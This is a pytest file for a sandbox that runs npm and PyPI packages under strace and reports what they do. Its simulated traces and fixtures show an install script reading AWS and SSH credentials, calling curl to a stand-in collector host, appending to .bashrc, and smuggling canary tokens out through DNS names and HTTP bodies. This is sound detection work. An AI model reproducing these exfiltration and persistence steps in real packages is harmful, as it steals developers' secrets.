"""Detonation, without Docker: canaries, the sink's parsing, the trace parser, attribution of
what the package did, the sandbox's Docker flags, and the report. The run inside a real
container is tested on Linux CI by tests/test_detonate_container.py."""
# ruff: noqa: E501 - the trace samples are strace lines as strace writes them

from __future__ import annotations

import base64
import io
import json
import socket
import struct
import subprocess
import tarfile
from pathlib import Path

import pytest

from bombsquad.cli import EXIT_ERROR, main
from bombsquad.detonate import canary, detonation, observe, runner, sink, trace
from bombsquad.detonate.canary import HOME

# Canaries -----------------------------------------------------------------------------------

def test_canaries_are_unique_and_found_in_every_encoding():
    first, second = canary.make(), canary.make()
    assert first.run != second.run and first.tokens["npm token"] != second.tokens["npm token"]
    secret = {"GitHub token": first.tokens["GitHub token"]}
    value = secret["GitHub token"].encode()
    for prefix in (b"", b"a", b"ab", b"abc"):
        blob = prefix + b'{"t":"' + value + b'","x":1}'
        assert canary.found_in(base64.b64encode(blob), secret) == ["GitHub token"]
    assert canary.found_in(b"q=" + value.hex().encode(), secret) == ["GitHub token"]
    url = base64.b64encode(b"x" + value).replace(b"+", b"%2B").replace(b"/", b"%2F")
    assert canary.found_in(url, secret) == ["GitHub token"]
    assert canary.found_in(b"nothing here", secret) == []
    assert ".npmrc" in first.files and first.env["NPM_TOKEN"] == first.tokens["npm token"]


# Sink ---------------------------------------------------------------------------------------

def _query(name: str, qtype: int = 1) -> bytes:
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
    return struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + labels + b"\0" + struct.pack(
        "!HH", qtype, 1)


def test_sink_answers_every_a_query_with_itself():
    assert sink.parse_query(_query("collector.example.invalid"))[1:3] == (
        "collector.example.invalid", 1)
    reply = sink.answer(_query("collector.example.invalid"), "172.30.0.2")
    assert reply[:2] == b"\x12\x34" and reply.endswith(socket.inet_aton("172.30.0.2"))
    assert struct.unpack("!H", sink.answer(_query("x.invalid", 28), "172.30.0.2")[6:8]) == (0,)
    assert sink.parse_query(b"\0" * 5) is None


def _client_hello(host: str) -> bytes:
    name = host.encode()
    sni = struct.pack("!HHHBH", 0, len(name) + 5, len(name) + 3, 0, len(name)) + name
    body = b"\x03\x03" + b"\0" * 32 + b"\0" + b"\x00\x02\x13\x01" + b"\x01\x00"
    body += struct.pack("!H", len(sni)) + sni
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake


def test_sink_reads_tls_server_names_and_http_requests():
    assert sink.server_name(_client_hello("api.example.invalid")) == "api.example.invalid"
    assert sink.server_name(b"GET / HTTP/1.1\r\n") is None
    request = b"POST /c HTTP/1.1\r\nHost: collector.invalid\r\nContent-Length: 2\r\n\r\nhi"
    assert sink.http_request(request) == {"method": "POST", "target": "/c",
                                          "host": "collector.invalid"}
    assert sink.http_request(b"\x00\x01binary") is None


# Trace --------------------------------------------------------------------------------------

NPM_TRACE = """\
100 10:00:00.000001 execve("/opt/detonate/stage.sh", ["/opt/detonate/stage.sh"], 0x7ffd /* 20 vars */) = 0
100 10:00:00.000100 chdir("/home/detonate/project") = 0
100 10:00:00.000200 execve("/usr/local/bin/npm", ["npm", "rebuild", "--offline", "demo"], 0x55 /* 20 vars */) = 0
100 10:00:00.000300 openat(AT_FDCWD, "/home/detonate/.npmrc", O_RDONLY|O_CLOEXEC) = 18
100 10:00:00.000400 clone3({flags=CLONE_VM|CLONE_VFORK, exit_signal=SIGCHLD, stack=0x7f, stack_size=0x9000}, 88 <unfinished ...>
101 10:00:00.000500 execve("/bin/sh", ["sh", "-c", "node install.js"], 0x5 /* 30 vars */) = 0
100 10:00:00.000600 <... clone3 resumed>) = 101
101 10:00:00.000700 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 102
102 10:00:00.000800 execve("/usr/local/bin/node", ["node", "install.js"], 0x5 /* 30 vars */) = 0
102 10:00:00.000900 openat(AT_FDCWD, "../.aws/credentials", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
102 10:00:00.001000 openat(AT_FDCWD, "/home/detonate/.ssh/id_ed25519", O_RDONLY|O_CLOEXEC) = 21
102 10:00:00.001100 sendto(22, "\\x12\\x34", 40, MSG_NOSIGNAL, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("172.30.0.2")}, 16) = 40
102 10:00:00.001200 connect(23, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("172.30.0.2")}, 16) = -1 EINPROGRESS (Operation now in progress)
102 10:00:00.001300 connect(24, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
102 10:00:00.001400 vfork() = 103
103 10:00:00.001500 execve("/usr/bin/curl", ["curl", "-s", "https://collector.invalid/"], 0x5 /* 30 vars */) = 0
103 10:00:00.001600 openat(AT_FDCWD, "/home/detonate/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0644) = 3
102 10:00:00.001700 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=103} ---
103 10:00:00.001800 +++ exited with 0 +++
100 10:00:00.002000 +++ exited with 0 +++
not a trace line
"""


def test_trace_parser_builds_the_process_tree():
    parsed = trace.parse(NPM_TRACE)
    assert parsed.first == 100 and parsed.exit_status == 0 and parsed.unparsed == 1
    assert parsed.processes[101].parent == 100 and parsed.processes[103].parent == 102
    assert parsed.processes[102].execs == [["node", "install.js"]]
    assert parsed.ancestors(103) == [102, 101, 100]
    paths = [o.path for o in parsed.opens]
    # Relative to the folder chdir() entered, which the child processes inherit.
    assert "/home/detonate/.aws/credentials" in paths
    [dns, https] = [c for c in parsed.connects if c.family == "inet"]
    assert (dns.call, dns.port) == ("sendto", 53)
    assert (https.port, https.ok) == (443, True)
    assert [c.address for c in parsed.connects if c.family == "unix"] == ["/var/run/nscd/socket"]


def _canaries() -> canary.Canaries:
    made = canary.make()
    return canary.Canaries("testrun00001", made.files, made.env, made.tokens)


def test_observation_separates_npm_from_the_package_code():
    secrets = _canaries()
    sent = base64.b64encode(json.dumps({"k": secrets.tokens["AWS secret key"]}).encode())
    npm_hex = secrets.tokens["npm token"].encode().hex()
    events = [{"kind": "ready", "address": "172.30.0.2"},
              {"kind": "dns", "name": "collector.invalid"},
              # The npm token, hex-encoded across two DNS labels.
              {"kind": "dns", "name": f"{npm_hex[:40]}.{npm_hex[40:]}.collector.invalid"},
              # A base64 JSON body that holds the AWS secret, sent base64-encoded again.
              {"kind": "tcp", "port": 80, "bytes": 10, "http": {"host": "collector.invalid"},
               "data": base64.b64encode(sent).decode()}]
    obs = observe.observe(trace.parse(NPM_TRACE), events, secrets, "npm")
    assert obs.hook_commands == ["node install.js"]
    # npm reading ~/.npmrc is expected; the install script's reads are not.
    assert [r["file"] for r in obs.credentials_read] == ["~/.aws/credentials",
                                                         "~/.ssh/id_ed25519"]
    assert [r["command"] for r in obs.programs_started] == [
        "curl -s https://collector.invalid/"]
    assert {(r["port"], r["call"]) for r in obs.network} == {(53, "sendto"), (443, "connect")}
    assert [r["file"] for r in obs.persistence] == ["/home/detonate/.bashrc"]
    assert {(r["secret"], r["via"]) for r in obs.credentials_sent} == {
        ("AWS secret key", "TCP port 80"), ("npm token", "DNS name")}
    assert "collector.invalid" in obs.dns_names
    assert obs.seen() == set(observe.CATEGORIES)

    comparison = observe.compare({"BS-NET-003", "BS-CR-001", "BS-EX-001"}, obs)
    assert comparison.confirmed == ["network", "credentials read", "credentials sent"]
    assert comparison.gaps == ["programs started", "persistence"]
    assert observe.compare({"BS-PRC-001"}, observe.observe(
        trace.parse(""), [], secrets, "npm")).not_observed == ["programs started"]


def test_pip_and_the_import_step_are_package_code_and_build_tools_are_named():
    text = """\
200 10:00:00.000001 execve("/opt/detonate/stage.sh", ["/opt/detonate/stage.sh"], 0x1 /* 9 vars */) = 0
200 10:00:00.000002 clone(child_stack=NULL, flags=SIGCHLD) = 201
201 10:00:00.000003 execve("/usr/local/bin/python", ["python", "-m", "pip", "install", "x.tar.gz"], 0x1 /* 9 vars */) = 0
201 10:00:00.000004 clone(child_stack=NULL, flags=SIGCHLD) = 202
202 10:00:00.000005 execve("/usr/local/bin/python", ["/usr/local/bin/python", "/usr/local/lib/python3.12/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py", "build_wheel", "/tmp/x"], 0x1 /* 9 vars */) = 0
202 10:00:00.000006 clone(child_stack=NULL, flags=SIGCHLD) = 203
203 10:00:00.000007 execve("/usr/bin/gcc", ["gcc", "-c", "x.c"], 0x1 /* 9 vars */) = 0
202 10:00:00.000008 clone(child_stack=NULL, flags=SIGCHLD) = 204
204 10:00:00.000009 execve("/bin/sh", ["sh", "-c", "id"], 0x1 /* 9 vars */) = 0
201 10:00:00.000010 openat(AT_FDCWD, "/home/detonate/.pypirc", O_RDONLY) = 5
200 10:00:00.000011 clone(child_stack=NULL, flags=SIGCHLD) = 205
205 10:00:00.000012 execve("/usr/local/bin/python", ["python", "/opt/detonate/import.py", "x"], 0x1 /* 9 vars */) = 0
205 10:00:00.000013 openat(AT_FDCWD, "/home/detonate/.git-credentials", O_RDONLY) = 6
200 10:00:00.000014 +++ exited with 0 +++
"""
    obs = observe.observe(trace.parse(text), [], _canaries(), "pypi")
    assert len(obs.hook_commands) == 2
    assert obs.build_tools == ["gcc"]
    assert [r["command"] for r in obs.programs_started] == ["sh -c id"]
    # pip itself reading ~/.pypirc is still reported, but not as package code.
    assert [(r["file"], r["package_code"]) for r in obs.credentials_read] == [
        ("~/.pypirc", False), ("~/.git-credentials", True)]


def test_pips_legacy_setup_py_caller_is_package_code_and_threads_belong_to_their_process():
    # Seen in a real run: without a pyproject.toml, pip runs setup.py through `python -c`
    # with its <pip-setuptools-caller> shim; npm reads ~/.npmrc from a worker thread.
    caller = "\\n# This is <pip-setuptools-caller> -- a caller that pip uses to run setup.py\\n"
    text = f"""\
300 10:00:00.000001 execve("/usr/local/bin/python", ["python", "-m", "pip"], 0x1 /* 9 vars */) = 0
300 10:00:00.000002 clone(child_stack=NULL, flags=SIGCHLD) = 301
301 10:00:00.000003 execve("/usr/local/bin/python", ["/usr/local/bin/python", "-c", "{caller}"..., "egg_info", "--egg-base", "/tmp/x"], 0x1 /* 9 vars */) = 0
301 10:00:00.000004 openat(AT_FDCWD, "/home/detonate/.aws/credentials", O_RDONLY|O_CLOEXEC) = 3
"""
    obs = observe.observe(trace.parse(text), [], _canaries(), "pypi")
    assert obs.hook_commands == ["setup.py egg_info (run by pip)"]
    assert [(r["command"], r["package_code"]) for r in obs.credentials_read] == [
        ("setup.py egg_info (run by pip)", True)]

    npm = """\
400 10:00:00.000001 execve("/usr/local/bin/npm", ["npm", "rebuild"], 0x1 /* 9 vars */) = 0
400 10:00:00.000002 clone3({flags=CLONE_VM|CLONE_THREAD, exit_signal=0, stack=0x7f, stack_size=0x9000}, 88) = 401
401 10:00:00.000003 openat(AT_FDCWD, "/home/detonate/.npmrc", O_RDONLY|O_CLOEXEC) = 17
"""
    assert observe.observe(trace.parse(npm), [], _canaries(), "npm").credentials_read == []


# Runner -------------------------------------------------------------------------------------

def _tar_members(data: bytes) -> dict[str, tarfile.TarInfo]:
    with tarfile.open(fileobj=io.BytesIO(data)) as tar:
        return {m.name: m for m in tar.getmembers()}


def test_payload_puts_canaries_in_home_and_npm_packages_in_node_modules(tmp_path):
    (tmp_path / "package.json").write_text('{"name": "@s/demo"}', encoding="utf-8")
    (tmp_path / "bin").mkdir()
    (tmp_path / "bin" / "run.sh").write_bytes(b"#!/bin/sh\necho hi\n")
    secrets = _canaries()
    members = _tar_members(runner.payload("npm", "@s/demo", "1.0.0", "demo-1.0.0.tgz", b"x",
                                          tmp_path, secrets))
    home = HOME.lstrip("/")
    assert members[f"{home}/.npmrc"].mode == 0o600 and members[f"{home}/.npmrc"].uid == 1001
    assert members[f"{home}/.ssh"].mode == 0o700
    module = f"{home}/project/node_modules/@s/demo"
    assert members[f"{module}/package.json"].uid == 1001
    assert members[f"{module}/bin/run.sh"].mode == 0o755
    assert members["detonate/in/demo-1.0.0.tgz"].uid == 0
    with pytest.raises(runner.DetonationError):
        runner.payload("pypi", "demo", "1", "../x.tar.gz", b"", None, secrets)
    with pytest.raises(runner.DetonationError):
        runner.check_name("npm", "../../etc")


def test_a_pypi_wheel_goes_in_beside_the_sdist_in_case_it_does_not_build():
    secrets = _canaries()
    members = _tar_members(runner.payload(
        "pypi", "demo", "1.0", "demo-1.0.tar.gz", b"sdist", None, secrets,
        fallback=("demo-1.0-py3-none-any.whl", b"wheel")))
    assert {"detonate/in/demo-1.0.tar.gz", "detonate/in/demo-1.0-py3-none-any.whl"} <= set(
        members)
    with pytest.raises(runner.DetonationError):
        runner.payload("pypi", "demo", "1.0", "demo-1.0.tar.gz", b"", None, secrets,
                       fallback=("../x.whl", b""))
    docker = FakeDocker()
    runner.run_detonation("pypi", "demo", "1.0", "demo-1.0.tar.gz", b"x", None, secrets,
                          run=docker.run, popen=docker.popen,
                          fallback=("demo-1.0-py3-none-any.whl", b"w"))
    [create] = [c for c in docker.calls if c[1] == "create"]
    assert "BS_FALLBACK=demo-1.0-py3-none-any.whl" in create
    # Whether the stage used it shows in the trace: pip was started with the wheel.
    ran = trace.Trace()
    ran.processes[7] = trace.Process(7, None, "/home/detonate", execs=[[
        "python", "-m", "pip", "install", "/detonate/in/demo-1.0-py3-none-any.whl"]])
    assert detonation.installed_fallback(ran, "demo-1.0-py3-none-any.whl")
    assert not detonation.installed_fallback(ran, "demo-1.0-cp312-manylinux_x86_64.whl")
    assert not detonation.installed_fallback(ran, None)


class FakeDocker:
    """Records docker commands and answers them as a working Docker would."""

    def __init__(self, fail: str | None = None) -> None:
        self.calls: list[list[str]] = []
        self.fail = fail

    def run(self, args, **kwargs):
        self.calls.append(args)
        out = b""
        if args[1] == "logs":
            out = (json.dumps({"kind": "ready", "address": "172.30.0.2"}) + "\n" + json.dumps(
                {"kind": "dns", "name": "collector.invalid"}) + "\n").encode()
        code = 1 if self.fail and self.fail in args else 0
        if args[:3] == ["docker", "image", "inspect"]:
            code = 1  # not built yet
        return subprocess.CompletedProcess(args, code, out, b"failed")

    def popen(self, args, **kwargs):
        self.calls.append(args)

        class Process:
            stdout = io.BytesIO(b'100 10:00:00.000001 +++ exited with 0 +++\n')

            def wait(self, timeout=None):
                return 0
        return Process()


def test_the_sandbox_has_no_mounts_no_route_out_and_no_extra_privileges():
    docker = FakeDocker()
    result = runner.run_detonation("pypi", "demo", "1.0", "demo-1.0.tar.gz", b"x", None,
                                   _canaries(), run=docker.run, popen=docker.popen)
    assert result.trace.startswith("100 ") and result.sink_events[1]["name"] == (
        "collector.invalid")
    flat = [arg for call in docker.calls for arg in call]
    for forbidden in ("-v", "--volume", "--mount", "--privileged", "--pid", "--ipc",
                      "--userns", "--device", "--cap-add=ALL", "host"):
        assert forbidden not in flat
    [network] = [c for c in docker.calls if c[1:3] == ["network", "create"]]
    assert "--internal" in network
    [create] = [c for c in docker.calls if c[1] == "create"]
    assert create[create.index("--cap-drop") + 1] == "ALL"
    assert [create[i + 1] for i, a in enumerate(create) if a == "--cap-add"] == [
        "SETUID", "SETGID", "SYS_PTRACE"]
    assert "no-new-privileges" in create and create[create.index("--dns") + 1] == "172.30.0.2"
    assert any(a.startswith("GITHUB_TOKEN=ghp_") for a in create)
    [run_sink] = [c for c in docker.calls if c[1] == "run"]
    assert "--read-only" in run_sink and run_sink[run_sink.index("--network") + 1] == network[-1]
    assert docker.calls[-2][:3] == ["docker", "rm", "--force"]
    assert docker.calls[-1][:3] == ["docker", "network", "rm"]


def test_the_sandbox_is_removed_when_a_step_fails():
    docker = FakeDocker(fail="cp")
    with pytest.raises(runner.DetonationError):
        runner.run_detonation("pypi", "demo", "1.0", "demo-1.0.tar.gz", b"x", None,
                              _canaries(), run=docker.run, popen=docker.popen)
    assert docker.calls[-2][:3] == ["docker", "rm", "--force"]
    assert docker.calls[-1][:3] == ["docker", "network", "rm"]


def test_image_contexts_are_tagged_by_content(tmp_path):
    (tmp_path / "a").mkdir()
    (tmp_path / "b").mkdir()
    tag = runner.image_context("npm", tmp_path / "a")
    assert tag == runner.image_context("npm", tmp_path / "b")
    assert (tmp_path / "a" / "Dockerfile").read_bytes().count(b"@sha256:") == 1
    assert b"\r\n" not in (tmp_path / "a" / "entry.sh").read_bytes()
    assert runner.image_context("sink", tmp_path / "a") != tag
    assert (tmp_path / "a" / "sink.py").is_file()


# Report -------------------------------------------------------------------------------------

def _npm_tarball(tmp_path: Path) -> Path:
    files = {"package/package.json": json.dumps({"name": "demo", "version": "1.0.0",
                                                 "scripts": {"postinstall": "node i.js"}}),
             "package/i.js": "const https = require('https');\n"
                             "https.request({hostname: 'collector.invalid'}).end();\n"}
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w:gz") as tar:
        for name, text in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(text.encode())
            tar.addfile(info, io.BytesIO(text.encode()))
    path = tmp_path / "demo-1.0.0.tgz"
    path.write_bytes(out.getvalue())
    return path


def test_detonate_reports_observations_against_the_static_scan(tmp_path, monkeypatch):
    monkeypatch.setattr(detonation.sys, "platform", "linux")
    seen = {}

    def fake_run(ecosystem, name, version, artifact_name, data, unpacked, canaries, timeout,
                 fallback=None):
        seen["unpacked"] = sorted(p.name for p in unpacked.iterdir())
        return runner.RunResult(NPM_TRACE, [{"kind": "dns", "name": "collector.invalid"}],
                                False, False)

    report = detonation.detonate("npm:demo@1.0.0", _npm_tarball(tmp_path),
                                 run_detonation=fake_run)
    assert seen["unpacked"] == ["i.js", "package.json"]
    assert "BS-NET-003" in report.static_rules
    assert "network" in report.comparison.confirmed
    assert "programs started" in report.comparison.gaps
    text = detonation.render(report)
    assert "Nothing observed does not mean safe." in text
    assert "not cleared" in text and "TLS traffic" in text
    assert json.loads(json.dumps(report.to_dict()))["subject"] == "npm:demo@1.0.0"


def test_detonate_runs_only_on_linux(monkeypatch, capsys, tmp_path):
    monkeypatch.setattr(detonation.sys, "platform", "win32")
    assert main(["detonate", "npm:demo@1.0.0", "--artifact",
                 str(_npm_tarball(tmp_path))]) == EXIT_ERROR
    assert "only on a Linux host" in capsys.readouterr().err
    with pytest.raises(ValueError):
        detonation.parse_spec("npm:demo")
